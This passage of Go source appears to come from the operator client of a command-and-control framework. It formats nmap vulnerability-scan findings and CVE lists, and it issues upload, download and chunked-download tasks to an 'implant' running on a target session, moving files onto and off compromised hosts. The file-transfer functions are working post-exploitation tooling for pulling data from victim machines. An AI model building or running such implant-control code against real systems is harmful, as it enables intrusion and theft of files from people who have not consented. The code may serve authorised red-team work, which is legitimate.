// often with a scan cut short at its deadline -- where the partial document can
// still be tens of kilobytes, most of it a single <scaninfo> attribute listing
// every port scanned. Dumping that buries the one line worth reading.
const rawOutputLimit = 4000

func truncateRaw(raw string) string {
	if len(raw) <= rawOutputLimit {
		if strings.HasSuffix(raw, "\n") {
			return raw
		}
		return raw + "\n"
	}
	return raw[:rawOutputLimit] + fmt.Sprintf("\n... [%d more bytes of raw output omitted]\n", len(raw)-rawOutputLimit)
}

// serviceVersion joins the version detail nmap gathered, skipping what it did
// not detect rather than printing empty columns.
func serviceVersion(s *ScanService) string {
	var parts []string
	if s.Product != "" {
		parts = append(parts, s.Product)
	}
	if s.Version != "" {
		parts = append(parts, s.Version)
	}
	if s.ExtraInfo != "" {
		parts = append(parts, "("+s.ExtraInfo+")")
	}
	if len(parts) == 0 {
		return "-"
	}
	return strings.Join(parts, " ")
}

// maxCVEsShown caps how many identifiers are printed for a single finding.
//
// An NSE script that matches the detected version against a CVE list can name a
// hundred of them; printing them all buries every other finding on the screen.
const maxCVEsShown = 8

func printFindings(findings []ScanFinding) {
	vulnerable, withCVEs := 0, 0
	for _, f := range findings {
		if f.Vulnerable {
			vulnerable++
		}
		if len(f.CVEs) > 0 {
			withCVEs++
		}
	}

	fmt.Printf("\n%sFINDINGS (%d script result(s): %d reported VULNERABLE, %d named CVE identifiers)%s\n",
		colorCyan, len(findings), vulnerable, withCVEs, colorReset)
	if len(findings) == 0 {
		printInfo("No script results.")
		return
	}

	for _, f := range findings {
		where := ""
		if f.Port != 0 {
			where = fmt.Sprintf(" [%s/%d]", f.Protocol, f.Port)
		}

		switch {
		case f.Vulnerable:
			fmt.Printf("  %s[!]%s %s%s", colorRed, colorReset, f.ScriptID, where)
		case len(f.CVEs) > 0:
			// A lead, not a verified finding: the script matched the detected
			// version against a CVE list rather than probing the service. Kept
			// visually distinct from a script that actually said VULNERABLE.
			fmt.Printf("  %s[?]%s %s%s", colorYellow, colorReset, f.ScriptID, where)
		default:
			fmt.Printf("  %s[-]%s %s%s", colorDim, colorReset, f.ScriptID, where)
		}

		if ids := formatCVEs(f.CVEs); ids != "" {
			fmt.Printf("  %s%s%s", colorYellow, ids, colorReset)
		}
		fmt.Println()

		// The output is the evidence, so it is shown for confirmed
		// vulnerabilities. For enumeration scripts it is noise that drowns out
		// the real findings.
		if f.Vulnerable && f.Output != "" {
			for _, line := range strings.Split(strings.TrimRight(f.Output, "\n"), "\n") {
				fmt.Printf("      %s%s%s\n", colorDim, line, colorReset)
			}
		}
	}
}

// formatCVEs renders at most maxCVEsShown identifiers, stating how many were
// left out rather than truncating silently.
func formatCVEs(cves []string) string {
	if len(cves) == 0 {
		return ""
	}
	shown, suffix := cves, ""
	if len(cves) > maxCVEsShown {
		shown = cves[:maxCVEsShown]
		suffix = fmt.Sprintf(" (+%d more)", len(cves)-maxCVEsShown)
	}
	return strings.Join(shown, " ") + suffix
}

// cmdUpload reads a local file and uploads it to the target.
//
// The implant's upload handler expects the wire args to be
// "<base64-data>|<remote-path>" (see the "upload" case in cmd/implant/main.go).
// The base64 payload must travel inside Args: the API's TaskRequest carries
// only type and args, so a separate field would be silently dropped.
func cmdUpload(client *api.Client, sessionID string, localPath string, remotePath string) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		printError(fmt.Sprintf("Failed to read local file: %v", err))
		return
	}

	printInfo(fmt.Sprintf("Uploading %s (%d bytes) -> %s", localPath, len(data), remotePath))

	cmdTask(client, sessionID, "upload", uploadTaskArgs(remotePath, data))
}

// uploadTaskArgs builds the wire args for an upload task. It must match the
// "base64data|remote-path" format the implant parses, or the target receives an
// empty payload.
func uploadTaskArgs(remotePath string, data []byte) string {
	return base64.StdEncoding.EncodeToString(data) + "|" + remotePath
}

// cmdDownload downloads a file from the target and saves it locally.
func cmdDownload(client *api.Client, sessionID string, remotePath string, localPath string) {
	if localPath == "" {
		localPath = filepath.Base(remotePath)
	}

	// Prefer chunked transfer; fall back to the legacy single-result download
	// when the implant does not implement the chunk task types.
	if cmdDownloadChunked(client, sessionID, remotePath, localPath) {
		return
	}

	req := TaskRequest{
		Type: "download",
		Args: remotePath,
	}

	var resp TaskResponse
	if err := client.Post("/api/sessions/"+sessionID+"/task", req, &resp); err != nil {
		printError(fmt.Sprintf("Failed to submit download task: %v", err))
		return
	}

	printInfo(fmt.Sprintf("Downloading %s -> %s", remotePath, localPath))

	result, ok := pollTask(client, resp.TaskID, taskPollTimeout)
	if !ok {
		return
	}
	if !result.Success {
		printError(fmt.Sprintf("Download failed: %s", result.Error))
		return
	}

	decoded, err := base64.StdEncoding.DecodeString(result.Output)
	if err != nil {
		printError(fmt.Sprintf("Failed to decode file data: %v", err))
		return
	}

	if err := os.WriteFile(localPath, decoded, 0644); err != nil {
		printError(fmt.Sprintf("Failed to write local file: %v", err))
		return
	}

	printSuccess(fmt.Sprintf("Downloaded %d bytes to %s", len(decoded), localPath))
}

// cmdDownloadChunked streams a file in bounded chunks, avoiding the frame-size
// and memory limits of a single base64 result. It returns false when the
// implant does not support download_stat/download_chunk, so the caller can use
// the legacy path.
func cmdDownloadChunked(client *api.Client, sessionID, remotePath, localPath string) bool {
	statResult, ok := submitAndPoll(client, sessionID, "download_stat", remotePath)
	if !ok || !statResult.Success {
		return false
	}
	var stat struct {
		Size   int64  `json:"size"`
		SHA256 string `json:"sha256"`
	}
	if err := json.Unmarshal([]byte(statResult.Output), &stat); err != nil {
		return false
	}

	printInfo(fmt.Sprintf("Downloading %s (%d bytes) -> %s", remotePath, stat.Size, localPath))

	file, err := os.Create(localPath)
	if err != nil {
		printError(fmt.Sprintf("Failed to create local file: %v", err))
		return true
	}
	defer file.Close()

	const chunkSize = 1 << 20
	hasher := sha256.New()
	var offset int64
	for offset < stat.Size {
		args, _ := json.Marshal(map[string]any{
			"path":   remotePath,
			"offset": offset,
			"length": chunkSize,
		})
		result, ok := submitAndPoll(client, sessionID, "download_chunk", string(args))
		if !ok {
			_ = os.Remove(localPath)
			return true
		}
		if !result.Success {
			printError(fmt.Sprintf("Chunk download failed at offset %d: %s", offset, result.Error))
			_ = os.Remove(localPath)
			return true
		}
		var chunk struct {
			Data   string `json:"data"`
			Length int    `json:"length"`
			EOF    bool   `json:"eof"`
		}
		if err := json.Unmarshal([]byte(result.Output), &chunk); err != nil {
			printError(fmt.Sprintf("Failed to parse chunk at offset %d: %v", offset, err))
			_ = os.Remove(localPath)
			return true
		}
		data, err := base64.StdEncoding.DecodeString(chunk.Data)
		if err != nil {
			printError(fmt.Sprintf("Failed to decode chunk at offset %d: %v", offset, err))
			_ = os.Remove(localPath)
			return true
		}
		if _, err := file.WriteAt(data, offset); err != nil {
			printError(fmt.Sprintf("Failed to write local chunk at offset %d: %v", offset, err))
			_ = os.Remove(localPath)
			return true
		}
		_, _ = hasher.Write(data)
		offset += int64(len(data))
		if chunk.EOF || len(data) == 0 {
			break
		}
	}

	if stat.SHA256 != "" {
		if got := hex.EncodeToString(hasher.Sum(nil)); got != stat.SHA256 {
			printWarning(fmt.Sprintf("SHA-256 mismatch: got %s, want %s", got, stat.SHA256))
		}
	}
	printSuccess(fmt.Sprintf("Downloaded %d bytes to %s", offset, localPath))
	return true
}
